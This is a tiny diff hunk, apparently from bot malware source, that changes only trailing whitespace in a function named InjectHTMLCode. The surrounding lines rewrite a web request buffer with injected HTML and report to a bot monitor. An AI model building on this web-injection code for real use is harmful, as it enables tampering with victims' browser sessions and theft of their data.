@@ -954,7 +954,7 @@ bool InjectHTMLCode(PRequest Request, THTMLInject *Inject)
 			Result = true;
 			Request::SetBuffer(Request, (LPBYTE)NewBuffer, NewLen);
 
-			SourceData->State = idsOk;
+			SourceData->State = idsOk;    
 
 			#ifdef BOTMONITOR
 				BotMonitor::SendMessage((PCHAR)BotMonitor::ConfigDataExec, (PCHAR)&SourceData->ID, sizeof(SourceData->ID));
